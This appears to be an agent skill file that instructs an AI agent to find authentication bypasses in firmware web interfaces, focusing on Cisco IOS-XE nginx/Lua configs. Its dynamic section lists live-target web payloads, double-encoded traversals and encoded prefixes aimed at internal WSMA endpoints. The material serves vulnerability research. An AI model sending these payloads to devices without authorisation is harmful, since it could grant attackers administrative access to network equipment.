---
name: webui-auth-bypass-discovery
description: "Discover authentication bypass vulnerabilities in embedded device Web UI components by analyzing static firmware rootfs and dynamically verifying against live targets. Use when tasked with finding auth bypasses in firmware WebUIs, especially Cisco IOS-XE devices using OpenResty/nginx/Lua. NOT for: general web app penetration testing unrelated to firmware/embedded systems."
category: general
---

# webui-auth-bypass-discovery

## Purpose
Discover authentication bypass vulnerabilities in embedded device Web UI components via static firmware rootfs analysis and dynamic live-target verification.

## CRITICAL RULES
1. **Runtime-generated configs**: If `nginx.conf` only contains `include /tmp/nginx.conf;`, the real configuration is generated at runtime. On Cisco IOS-XE, the generator is typically `/usr/binos/bin/x86_64_crb_linux_iosd*` and shared libraries such as `/usr/binos/lib64/libpsd_mod_ui.so`. Extract nginx/restconf fragments with `strings -n 8 <file> | grep -E "(location|listen|proxy_pass|internal|webui_wsma|lua5|restconf|upstream)"`.
2. **Large files**: Do NOT use `Read` on large Lua or binary files (>50 KB) because it times out. Use `grep`, `strings`, `head`, or `sed` to extract relevant sections.
3. **Cross-skill**: If analyzing Cisco firmware with WSMA endpoints, invoke the `cisco-wsma-enumeration` skill to augment attack-surface mapping.

## Static Analysis (rootfs-copy)
1. Find web server binaries: `find rootfs-copy -type f \( -name "nginx" -o -name "lighttpd" -o -name "httpd" -o -name "uhttpd" -o -name "boa" \)`
2. Find config files with server/location directives: `find rootfs-copy -type f -name "*.conf" | xargs grep -l -E "server|location|listen" 2>/dev/null`
3. If nginx config is a stub pointing to `/tmp/nginx.conf`:
   - Trace the generator: `grep -ra "/tmp/nginx.conf" rootfs-copy --binary`
   - On Cisco IOS-XE, inspect the iosd binary and `libpsd_mod_ui.so` for directives (look for `liin` VRF, backend IPs such as `192.168.1.6`, and internal locations).
4. Check for restconf runtime includes:
   - `restconf-location.conf` may contain `include /tmp/restconf/proxy/*.conf;`
   - `restconf-servers.conf` may contain `include /tmp/restconf/confd_interface/*.conf;`
   - Extract restconf strings from shared libraries: `strings rootfs-copy/usr/binos/lib64/libpsd_mod_ui.so | grep -E "restconf|upstream|location"`
5. Check lighttpd WebUI configs:
   - `wui-lighttpd.conf` and `wui-lighttpd-inc.conf` may contain SCGI backend mappings and auth proxy rules.
6. Inspect Lua handlers without reading entire files:
   - `grep -n "internalWebui\|lua5\|webui_wsma\|auth_proxy" rootfs-copy/var/scripts/lua/features/*.lua rootfs-copy/usr/binos/openresty/nginx/conf/*.lua`
   - Key files in `/var/scripts/lua/features/`: `baseHandler.lua`, `urlMap.lua`, `utils.lua`, `WSMAApiLib.lua`
   - Also check `/var/LibLua/WSMAApiLib.lua` and `/usr/binos/openresty/nginx/conf/smgmt2.lua`
7. Reconstruct the URL map and authentication proxy flow:
   - Read `/usr/binos/openresty/nginx/conf/auth_proxy.conf` (internal proxy rules)
   - Read `/usr/binos/openresty/nginx/conf/http_common.conf` (lua_package_path and common HTTP setup)
   - Read `/usr/binos/openresty/nginx/conf/aaa_attr.lua` (AAA attribute storage/retrieval for auth proxy)
   - Also extract binary strings as needed.

## Dynamic Verification (live target)
1. Test direct access to internal endpoints (expect 404 if correctly blocked):
   - `/webui_wsma_http`
   - `/webui_wsma_https`
   - `/lua5`
2. Test double URL-encoding path traversals:
   - `https://<target>/webui/%252e%252e%252fwebui_wsma_https`
   - `https://<target>/webui/%252e%252e%252fwebui_wsma_http`
3. Test double-encoded character prefix to evade location matching (WSMA endpoints typically require POST with SOAP/XML):
   - `https://<target>/%2577ebui_wsma_https`
   - `https://<target>/%2577ebui_wsma_http`
4. **Interpreting 302 responses**: If a traversal payload returns 302 instead of 404, it may have reached an internal location that redirects unauthenticated users to `/webui/login/`. Follow redirects with `curl -L` and inspect the final URL and page content. If you land on a functional internal page, bypass is confirmed. If you still land on the login page, the location is reachable but may require session tokens—note this as a partial bypass / anomalous access.
5. Record all status codes and response differences between direct access, single-encoded, and double-encoded requests.

## Expected Output
- Reconstructed nginx location blocks and internal endpoints
- Dynamic test matrix with HTTP status codes
- Vulnerability verdict: confirmed bypass, partial bypass, or no bypass
